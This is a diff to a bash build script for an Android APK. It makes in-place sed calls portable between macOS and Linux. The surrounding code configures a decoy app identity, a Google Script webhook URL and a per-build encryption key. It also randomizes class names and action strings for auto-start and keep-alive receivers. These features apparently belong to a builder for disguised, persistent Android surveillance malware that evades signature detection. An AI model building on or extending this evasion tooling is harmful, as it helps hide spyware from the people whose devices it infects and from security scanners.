@@ -76,6 +76,19 @@ detect_os() {
         OS="linux"
     elif [[ "$OSTYPE" == "darwin"* ]]; then
         OS="mac"
+    else
+        OS="linux" # Fallback
+    fi
+}
+
+detect_os
+
+# Portable sed in-place
+sed_i() {
+    if [ "$OS" == "mac" ]; then
+        sed -i '' "$@"
+    else
+        sed -i "$@"
     fi
 }
 
@@ -170,10 +183,10 @@ configure_app() {
     DECOY_CHOICE=${DECOY_CHOICE:-1}
 
     BUILD_GRADLE="$PROJECT_DIR/app/build.gradle"
-    sed -i '' "s|applicationId \"[^\"]*\"|applicationId \"$PKG_NAME\"|g" "$BUILD_GRADLE"
-    sed -i '' "s|versionName \".*\"|versionName \"$VERSION_NAME\"|g" "$BUILD_GRADLE"
-    sed -i '' "s|minSdk [0-9]*|minSdk $MIN_SDK|g" "$BUILD_GRADLE"
-    sed -i '' "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">$APP_NAME</string>|g" "$PROJECT_DIR/app/src/main/res/values/strings.xml"
+    sed_i "s|applicationId \"[^\"]*\"|applicationId \"$PKG_NAME\"|g" "$BUILD_GRADLE"
+    sed_i "s|versionName \".*\"|versionName \"$VERSION_NAME\"|g" "$BUILD_GRADLE"
+    sed_i "s|minSdk [0-9]*|minSdk $MIN_SDK|g" "$BUILD_GRADLE"
+    sed_i "s|<string name=\"app_name\">.*</string>|<string name=\"app_name\">$APP_NAME</string>|g" "$PROJECT_DIR/app/src/main/res/values/strings.xml"
     
     echo "PKG_NAME=\"$PKG_NAME\"" > "$CONFIG_FILE"
     echo "APP_NAME=\"$APP_NAME\"" >> "$CONFIG_FILE"
@@ -184,15 +197,15 @@ configure_app() {
     read -p "    Enter Webhook URL (Google Script): " WEB_URL
     if [ -n "$WEB_URL" ]; then
         # Use a different delimiter for sed in case URL contains |
-        sed -i '' "s|WEBHOOK_URL=.*|WEBHOOK_URL=$WEB_URL|g" "$PROJECT_DIR/local.properties"
+        sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=$WEB_URL|g" "$PROJECT_DIR/local.properties"
     else
         # Ensure it's at least empty if not set, without corrupting
-        sed -i '' "s|WEBHOOK_URL=.*|WEBHOOK_URL=|g" "$PROJECT_DIR/local.properties"
+        sed_i "s|WEBHOOK_URL=.*|WEBHOOK_URL=|g" "$PROJECT_DIR/local.properties"
     fi
 
     # Persist Decoy Choice for build.gradle
     if grep -q "DECOY_CHOICE=" "$PROJECT_DIR/local.properties"; then
-        sed -i '' "s|DECOY_CHOICE=.*|DECOY_CHOICE=$DECOY_CHOICE|g" "$PROJECT_DIR/local.properties"
+        sed_i "s|DECOY_CHOICE=.*|DECOY_CHOICE=$DECOY_CHOICE|g" "$PROJECT_DIR/local.properties"
     else
         echo "DECOY_CHOICE=$DECOY_CHOICE" >> "$PROJECT_DIR/local.properties"
     fi
@@ -200,7 +213,7 @@ configure_app() {
     # Generate Dynamic Encryption Key for every build
     RAND_KEY=$(LC_ALL=C tr -dc 'A-Za-z0-9' </dev/urandom | head -c 16)
     if grep -q "ENCRYPTION_KEY=" "$PROJECT_DIR/local.properties"; then
-        sed -i '' "s|ENCRYPTION_KEY=.*|ENCRYPTION_KEY=$RAND_KEY|g" "$PROJECT_DIR/local.properties"
+        sed_i "s|ENCRYPTION_KEY=.*|ENCRYPTION_KEY=$RAND_KEY|g" "$PROJECT_DIR/local.properties"
     else
         echo "ENCRYPTION_KEY=$RAND_KEY" >> "$PROJECT_DIR/local.properties"
     fi
@@ -238,9 +251,13 @@ configure_app() {
         echo "$ENTITY:$RAND_NAME" >> "$MAPPING_FILE"
 
         # Update Manifest
-        sed -i '' "s|\.$ENTITY|.$RAND_NAME|g" "$MANIFEST"
+        sed_i "s|\.$ENTITY|.$RAND_NAME|g" "$MANIFEST"
         # Update all Java files
-        find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i '' "s/$ENTITY/$RAND_NAME/g" {} +
+        if [ "$OS" == "mac" ]; then
+            find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i '' "s/$ENTITY/$RAND_NAME/g" {} +
+        else
+            find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i "s/$ENTITY/$RAND_NAME/g" {} +
+        fi
         # Rename the actual file
         FILE_PATH=$(find "$PROJECT_DIR/app/src/main/java" -type f -name "$ENTITY.java")
         if [ -n "$FILE_PATH" ]; then
@@ -257,13 +274,13 @@ configure_app() {
 
     for FIELD in "${ACTION_FIELDS[@]}"; do
         RAND_ACTION="${ACT_PREFIX}.$(LC_ALL=C tr -dc 'A-Z0-9' </dev/urandom | head -c 12)"
-        sed -i '' "s|public static final String $FIELD = \".*\";|public static final String $FIELD = \"$RAND_ACTION\";|g" "$CONSTANTS_JAVA"
+        sed_i "s|public static final String $FIELD = \".*\";|public static final String $FIELD = \"$RAND_ACTION\";|g" "$CONSTANTS_JAVA"
     done
 
     # Also update Manifest to match Constants actions if they are hardcoded there
     # (Checking Manifest, it seems some are hardcoded in <receiver> tags)
-    sed -i '' "s|com.labs.stability.ST_P_01|$(grep "ACTION_AUTO_START" "$CONSTANTS_JAVA" | cut -d'"' -f2)|g" "$MANIFEST"
-    sed -i '' "s|com.labs.stability.ST_P_02|$(grep "ACTION_KEEP_ALIVE" "$CONSTANTS_JAVA" | cut -d'"' -f2)|g" "$MANIFEST"
+    sed_i "s|com.labs.stability.ST_P_01|$(grep "ACTION_AUTO_START" "$CONSTANTS_JAVA" | cut -d'"' -f2)|g" "$MANIFEST"
+    sed_i "s|com.labs.stability.ST_P_02|$(grep "ACTION_KEEP_ALIVE" "$CONSTANTS_JAVA" | cut -d'"' -f2)|g" "$MANIFEST"
 }
 
 # Progress bar function (SMOOTH OVERWRITE STYLE)
@@ -351,9 +368,13 @@ build_apk() {
         # We need to read the file and reverse its lines or just process normally.
         while IFS=: read -r ENTITY RAND; do
             # Update Manifest
-            sed -i '' "s|\.$RAND|\.$ENTITY|g" "$MANIFEST"
+            sed_i "s|\.$RAND|\.$ENTITY|g" "$MANIFEST"
             # Update all Java files
-            find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i '' "s/$RAND/$ENTITY/g" {} +
+            if [ "$OS" == "mac" ]; then
+                find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i '' "s/$RAND/$ENTITY/g" {} +
+            else
+                find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i "s/$RAND/$ENTITY/g" {} +
+            fi
             # Rename the actual file
             FILE_PATH=$(find "$PROJECT_DIR/app/src/main/java" -type f -name "$RAND.java")
             if [ -n "$FILE_PATH" ]; then
